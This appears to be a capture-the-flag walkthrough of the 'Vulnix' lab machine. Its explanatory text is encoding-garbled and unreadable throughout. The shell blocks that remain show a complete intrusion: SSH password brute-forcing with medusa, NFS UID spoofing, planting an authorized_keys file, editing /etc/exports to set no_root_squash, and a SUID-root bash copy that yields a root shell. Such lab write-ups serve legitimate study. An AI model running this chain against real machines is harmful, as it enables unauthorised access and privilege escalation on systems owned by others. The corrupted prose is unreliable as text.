```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# mount -t nfs 192.168.32.143:/home/vulnix  /data/vulnix
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# ls -al /data/vulnix 
ls: cannot open directory '/data/vulnix': Permission denied
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# ls -al /data/                                                        2 â¨¯
total 48
drwxr-xr-x  3 root   root        4096 May 29 22:16 .
drwxr-xr-x 20 root   root       36864 May 29 22:16 ..
drwxr-x---  2 nobody 4294967294  4096 Sep  2  2012 vulnix
```
æ— æ³•è®¿é—®æŒ‚è½½çš„å…±äº«ï¼Œå¯èƒ½æ˜¯å› ä¸º[è®¾ç½®äº† root_squash æ ‡å¿—](https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/Security_Guide/sect-Security_Guide-Securing_NFS-Do_Not_Use_the_no_root_squash_Option.html)ã€‚æˆ‘ä»¬å¯ä»¥æ”¾å¿ƒåœ°å‡è®¾ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªåä¸º vulnix ä¸”å…·æœ‰ç›¸åŒ UID çš„ç”¨æˆ·ï¼Œæˆ‘ä»¬å°†èƒ½å¤Ÿè®¿é—®å®ƒã€‚ä½†æˆ‘ä»¬ç¨åå†è°ˆã€‚
### è·å–æƒé™
#### SSHæœåŠ¡çˆ†ç ´
åˆ›å»ºç”¨æˆ·æ–‡ä»¶
```
user
vulnix
root
```
ç„¶åä½¿ç”¨å­—å…¸åˆ—è¡¨rockyou.txtç ´è§£å¯†ç ï¼š
```
root@kali:~/vulnhub/vulnix# medusa -h 192.168.32.143  -U user.txt -P /usr/share/wordlists/rockyou.txt -e ns -f -M ssh -t 64
```
ç»ˆäºç ´è§£äº†ç”¨æˆ·userçš„å¯†ç ï¼Œå³`letmein`ã€‚
```
â”Œâ”€â”€(rootğŸ’€kali)-[/tmp]
â””â”€# ssh PI:EMAIL                                                                                    
The authenticity of host '192.168.32.143 (192.168.32.143)' can't be established.
ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.32.143' (ECDSA) to the list of known hosts.
PI:EMAIL's password: 
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
 * Documentation:  https://help.ubuntu.com/
  System information as of Mon May 30 04:28:36 BST 2022
  System load:  0.0              Processes:           89
  Usage of /:   90.3% of 773MB   Users logged in:     0
  Memory usage: 7%               IP address for eth0: 192.168.32.143
  Swap usage:   0%
  => / is using 90.3% of 773MB
  Graph this data and manage this system at https://landscape.canonical.com/
user@vulnix:~$ 
```
æ£€æŸ¥å—å®³æœåŠ¡å™¨ä¸Šçš„/etc/passwdæ–‡ä»¶ï¼Œå‘ç°ç”¨æˆ·vulnixå…·æœ‰UID 2008ï¼Œå› æ­¤åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šåˆ›å»ºäº†ä¸€ä¸ªåä¸ºvulnixçš„ç”¨æˆ·ï¼ŒUIDä¸º2008ï¼Œç„¶åå°è¯•å†æ¬¡è®¿é—®è¯¥åˆ†åŒºï¼š
![image-20220530113030002](../../.gitbook/assets/image-20220530113030002.png)
ä½¿ç”¨æ–°åˆ›å»ºçš„vulnixç”¨æˆ·ï¼ˆå…·æœ‰UID 2008æƒé™ï¼‰æˆåŠŸè¿›å…¥å·²ç»æŒ‚è½½çš„/mnt/vulnixæ–‡ä»¶å¤¹
```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# useradd -u 2008 vulnix
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# su vulnix
$ cd /data/vulnix
$ ls -al
total 20
drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 .
drwxr-xr-x 3 root   root   4096 May 29 22:16 ..
-rw-r--r-- 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
-rw-r--r-- 1 vulnix vulnix  675 Apr  3  2012 .profile
```
ç”Ÿæˆä¸€ä¸ªSSHå¯†é’¥ï¼Œä»¥vulnixç”¨æˆ·èº«ä»½ç™»å½•è€Œä¸éœ€è¦å¯†ç ï¼š
```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): 
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /root/.ssh/id_rsa
Your public key has been saved in /root/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:N6J9EV4I5eAiJwrnp4HeSEXnh4jXL3ayejUzBPkdGgo root@kali
The key's randomart image is:
+---[RSA 3072]----+
|   . .. o..      |
|  oE=o.o = .     |
|...+++*.= = .    |
| =o. =o= o o     |
|..+ .+.oS =      |
|o o+. =B o o     |
| o.. .o = .      |
|    ..   .       |
|   ..            |
+----[SHA256]-----+
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# cp /root/.ssh/id_rsa.pub /tmp/authorized_keys 
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# chmod 777 /tmp/authorized_keys    
```
NFSè‚¡ç¾æ–‡ä»¶å¤¹æ”¾å…¥å…¬é’¥
```
$ mkdir .ssh
$ cd .ssh       
$ cp /tmp/authorized_keys .
$ ls
authorized_keys
```
ä½¿ç”¨å…¬é’¥è¿›è¡Œç™»å½•
```
â”Œâ”€â”€(rootğŸ’€kali)-[~]
â””â”€# ssh PI:EMAIL -i id_rsa       
Warning: Identity file id_rsa not accessible: No such file or directory.
Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
 * Documentation:  https://help.ubuntu.com/
  System information as of Mon May 30 05:49:42 BST 2022
  System load:  0.0              Processes:           92
  Usage of /:   90.3% of 773MB   Users logged in:     1
  Memory usage: 9%               IP address for eth0: 192.168.32.143
  Swap usage:   0%
  => / is using 90.3% of 773MB
  Graph this data and manage this system at https://landscape.canonical.com/
Your Ubuntu release is not supported anymore.
For upgrade information, please visit:
http://www.ubuntu.com/releaseendoflife
New release '14.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.
The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
vulnix@vulnix:~$ 
```
### ææƒ
```
vulnix@vulnix:~$ sudo -l
Matching 'Defaults' entries for vulnix on this host:
    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User vulnix may run the following commands on this host:
    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
```
å¯ä»¥è¿è¡Œå‘½ä»¤æ¥æ‰“å¼€/etc/exportsï¼Œä¸ç”¨è¾“å…¥å¯†ç ã€‚è¿™æ˜¯å‘ç°çš„ï¼š
![image-20220530133305240](../../.gitbook/assets/image-20220530133305240.png)
ç”¨no_root_squashæ›¿æ¢äº†root_squash flagã€‚éœ€è¦ä½œå¼Šï¼Œå› ä¸ºæ²¡æœ‰vulnixçš„å¯†ç ï¼Œè€Œä¸”æ²¡æœ‰sudoç”¨æˆ·æ‰§è¡Œå‘½ä»¤/usr/sbin/exportfs -aæˆ–è®¡ç®—æœºé‡æ–°å¼•å¯¼ï¼Œå°±æ— æ³•å†æ¬¡å¯¼å‡ºNFSåˆ†åŒºï¼Œæ‰€ä»¥æ‰‹åŠ¨é‡æ–°å¼•å¯¼
- root_squashï¼š å®¢æˆ·ç«¯çš„rootç”¨æˆ·æ˜ å°„åˆ°ä»»ä½•äººï¼šå®¢æˆ·ç«¯æ— æ³•ä½¿ç”¨setuidä½å°†æ¶æ„è½¯ä»¶ç•™ç»™ä»–äººæ‰§è¡Œã€‚
- no_root_squashï¼šé€šè¿‡æ­¤é€‰é¡¹ï¼Œåœç”¨äº†æ­¤å®‰å…¨åŠŸèƒ½ï¼Œä»è€Œå…è®¸å®¢æˆ·ç«¯çš„rootæƒé™æ“ä½œæœ€ç»ˆä»¥rootèº«ä»½å‡ºç°åœ¨å¯¼å‡ºçš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼ˆå› æ­¤ï¼Œåœ¨å…¶ä½™å®¢æˆ·ç«¯ä¸­ï¼‰ã€‚
åœ¨å—å®³è€…çš„æœºå™¨ä¸Šï¼Œå¦‚"vulnix"ï¼š
```
vulnix@vulnix:~$ cp /bin/bash local_shell
vulnix@vulnix:~$ ls
local_shell
```
åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šï¼Œä»¥`root`èº«ä»½ï¼š
```
root@kali:/mnt/vulnix# cat local_shell > spawn_root_shell
root@kali:/mnt/vulnix# ls
local_shell  spawn_root_shell
root@kali:/mnt/vulnix# chmod 4777 *
root@kali:/mnt/vulnix# ls -la
æ€»ç”¨é‡ 1828
drwxr-x--- 4 vulnix vulnix   4096 4æœˆ  16 02:33 .
drwxr-xr-x 3 root   root     4096 4æœˆ  15 23:00 ..
-rw------- 1 vulnix vulnix      0 4æœˆ  16 02:27 .bash_history
-rw-r--r-- 1 vulnix vulnix    220 4æœˆ   3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix   3486 4æœˆ   3  2012 .bashrc
drwx------ 2 vulnix vulnix   4096 4æœˆ  15 23:23 .cache
-rwsrwxrwx 1 vulnix vulnix 920788 4æœˆ  16 02:24 local_shell
-rw-r--r-- 1 vulnix vulnix    675 4æœˆ   3  2012 .profile
-rwsrwxrwx 1 root   root   920788 4æœˆ  16 02:33 spawn_root_shell
drwxr-xr-x 2 vulnix vulnix   4096 4æœˆ  15 23:21 .ssh
```
ç„¶ååœ¨å—å®³äººçš„æœºå™¨ä¸Šæ‰§è¡Œshellï¼Œå¹¶ä¿ç•™å¸¦æœ‰flag -pçš„åŸå§‹æ–‡ä»¶çš„æƒé™ï¼š
```
vulnix@vulnix:~$ ls -la
total 1828
drwxr-x--- 4 vulnix vulnix   4096 Apr 16 07:33 .
drwxr-xr-x 4 root   root     4096 Sep  2  2012 ..
-rw------- 1 vulnix vulnix      0 Apr 16 07:27 .bash_history
-rw-r--r-- 1 vulnix vulnix    220 Apr  3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix   3486 Apr  3  2012 .bashrc
drwx------ 2 vulnix vulnix   4096 Apr 16 04:23 .cache
-rwsrwxrwx 1 vulnix vulnix 920788 Apr 16 07:24 local_shell
-rw-r--r-- 1 vulnix vulnix    675 Apr  3  2012 .profile
-rwsrwxrwx 1 root   root   920788 Apr 16 07:33 spawn_root_shell
drwxr-xr-x 2 vulnix vulnix   4096 Apr 16 04:21 .ssh
vulnix@vulnix:~$ ./spawn_root_shell -p
spawn_root_shell-4.2# id
uid=2008(vulnix) gid=2008(vulnix) euid=0(root) groups=0(root),2008(vulnix)
spawn_root_shell-4.2# whoami
root
spawn_root_shell-4.2# cd /root
spawn_root_shell-4.2# ls
trophy.txt
spawn_root_shell-4.2# cat trophy.txt
cc614640424f5bd60ce5d5264899c3be
```